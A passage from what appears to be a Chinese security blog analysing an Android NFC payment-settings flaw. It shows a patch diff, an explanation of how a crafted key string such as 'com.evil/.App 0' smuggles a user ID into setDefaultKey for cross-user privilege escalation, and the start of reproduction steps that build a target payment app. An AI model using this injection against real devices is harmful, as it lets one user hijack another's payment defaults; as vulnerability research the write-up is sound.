<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">        public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> int</span><span style="color:#59873A;--shiki-dark:#80A665"> hashCode</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//支付 App 的身份 =(ComponentName, UserHandle)这正是 NFC 默认支付的真实语义</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">            return</span><span style="color:#B07D48;--shiki-dark:#BD976A"> Objects</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">hash</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">componentName</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> userHandle</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">        @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">        public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> boolean</span><span style="color:#59873A;--shiki-dark:#80A665"> equals</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Object </span><span style="color:#B07D48;--shiki-dark:#BD976A">o</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">            if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">o </span><span style="color:#AB5959;--shiki-dark:#CB7676">==</span><span style="color:#A65E2B;--shiki-dark:#C99076"> this</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#1E754F;--shiki-dark:#4D9375"> return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> true</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">            if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#AB5959;--shiki-dark:#CB7676">!</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">o </span><span style="color:#AB5959;--shiki-dark:#CB7676">instanceof</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> PaymentAppInfo</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#1E754F;--shiki-dark:#4D9375"> return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> false</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            PaymentAppInfo</span><span style="color:#B07D48;--shiki-dark:#BD976A"> appInfo</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">PaymentAppInfo</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> o</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">            return</span><span style="color:#B07D48;--shiki-dark:#BD976A"> componentName</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">equals</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">appInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">componentName</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">                    &amp;&amp;</span><span style="color:#B07D48;--shiki-dark:#BD976A"> userHandle</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">equals</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">appInfo</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">userHandle</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     </span><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span></code></pre>
<h3 id="4分析"><a class="anchor" href="#4分析">#</a> 4.分析</h3>
<p><strong>字符串拼接与分割逻辑导致的“参数注入”</strong></p>
<p>系统将 <code>ComponentName</code>（组件名）和 <code>UserId</code>（用户ID）简单地用空格拼成一个字符串（如 <code>com.foo/.Pay 10</code>）作为 Key。当需要设置默认应用时，系统接收这个 Key，用空格切割，取后半部分直接作为 <code>UserId</code> 去执行设置操作。</p>
<p>攻击者能够通过向 <code>setDefaultKey</code> 函数传入一个恶意的字符串（例如 <code>com.evil/.App 0</code>），系统会将字符串切割，错误地提取出 <code>UserId = 0</code>（主用户）可以欺骗 Settings 应用，强制修改主用户（User 0）的 NFC 支付设置，实现跨用户权限提升</p>
<h2 id="二漏洞复现-3"><a class="anchor" href="#二漏洞复现-3">#</a> （二）漏洞复现</h2>
<h3 id="1安装目标nfc应用"><a class="anchor" href="#1安装目标nfc应用">#</a> 1.安装目标NFC应用</h3>
<p>该目标应用用于充当NFC应用，作为被攻击的目标，告诉系统是一个 NFC 支付应用，该目标程序需要安装在User 0 下</p>
<h4 id="11-编写mainactivitykt"><a class="anchor" href="#11-编写mainactivitykt">#</a> 1.1 编写MainActivity.kt</h4>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-kotlin"><span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">package</span><span style="color:#59873A;--shiki-dark:#80A665"> com.example.targetapp</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#59873A;--shiki-dark:#80A665"> android.app.Activity</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#59873A;--shiki-dark:#80A665"> android.os.Bundle</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#59873A;--shiki-dark:#80A665"> android.widget.TextView</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">class</span><span style="color:#2E8F82;--shiki-dark:#5DA994"> MainActivity</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> : </span><span style="color:#2E8F82;--shiki-dark:#5DA994">Activity</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    override</span><span style="color:#1E754F;--shiki-dark:#4D9375"> fun</span><span style="color:#59873A;--shiki-dark:#80A665"> onCreate</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">savedInstanceState: </span><span style="color:#2E8F82;--shiki-dark:#5DA994">Bundle</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">?</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#C99076">        super</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">.</span><span style="color:#59873A;--shiki-dark:#80A665">onCreate</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">savedInstanceState</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 简单设置一个文本视图，显示这是一个靶子应用</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        val</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> textView </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#59873A;--shiki-dark:#80A665"> TextView</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#A65E2B;--shiki-dark:#C99076">this</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        textView.text </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B56959;--shiki-dark:#C98A7D"> "Target Payment App Installed"</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        textView.textSize </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 24f</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">        setContentView</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">textView</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span></code></pre>
<h4 id="12-编写-androidmanifestxml"><a class="anchor" href="#12-编写-androidmanifestxml">#</a> 1.2 编写 <code>AndroidManifest.xml</code></h4>
<p>必须声明一个 <code>HostApduService</code>，并加上 <code>PAYMENT</code> 类别</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-xml"><span class="line"><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">manifest</span><span style="color:#B07D48;--shiki-dark:#BD976A"> xmlns</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">android</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">http://schemas.android.com/apk/res/android</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">    package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">com.example.targetapp</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">uses-permission</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.permission.NFC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666"> /</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">application</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">label</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">Target Pay</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">icon</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">@mipmap/ic_launcher</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">service</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">com.example.targetapp.MyHostApduService</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">exported</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">true</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">permission</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.permission.BIND_NFC_SERVICE</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">intent-filter</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">action</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.nfc.cardemulation.action.HOST_APDU_SERVICE</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">intent-filter</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">meta-data</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.nfc.cardemulation.host_apdu_service</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">resource</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">@xml/apduservice</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">service</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">activity</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">com.example.targetapp.MainActivity</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">exported</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">true</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">intent-filter</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">action</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.intent.action.MAIN</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666"> /</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">category</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.intent.category.LAUNCHER</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666"> /</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">intent-filter</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">activity</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">application</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">manifest</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121163546020.png" alt="image-20260121163546020"></p>
<h4 id="13-创建资源文件-resxmlapduservicexml"><a class="anchor" href="#13-创建资源文件-resxmlapduservicexml">#</a> 1.3 创建资源文件 <code>res/xml/apduservice.xml</code></h4>
<p>这个文件定义了应用支持的 AID（应用标识符）。为了被系统识别为“支付应用”，必须包含 <code>category="payment"</code></p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-xml"><span class="line"><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">host-apdu-service</span><span style="color:#B07D48;--shiki-dark:#BD976A"> xmlns</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">android</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">http://schemas.android.com/apk/res/android</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">    android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">description</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">@string/app_name</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">    android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">requireDeviceUnlock</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">false</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">aid-group</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">description</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">@string/app_name</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">category</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">payment</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">aid-filter</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">F0010203040506</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#1E754F;--shiki-dark:#4D9375">aid-filter</span><span style="color:#B07D48;--shiki-dark:#BD976A"> android</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#B07D48;--shiki-dark:#BD976A">name</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">A0000000041010</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">aid-group</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#999999;--shiki-dark:#666666">/</span><span style="color:#1E754F;--shiki-dark:#4D9375">host-apdu-service</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span></span>
<span class="line"></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121163815701.png" alt="image-20260121163815701"></p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121163932485.png" alt="image-20260121163932485"></p>
<h4 id="14-创建空的-service-类"><a class="anchor" href="#14-创建空的-service-类">#</a> 1.4  创建空的 Service 类</h4>
<p><strong><code>MyHostApduService.kt</code></strong> 代码可以是空的，只要继承类即可，Kotlin 类，告诉系统能处理 NFC 支付请求</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> com</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">example</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">targetapp</span></span>
<span class="line"></span>
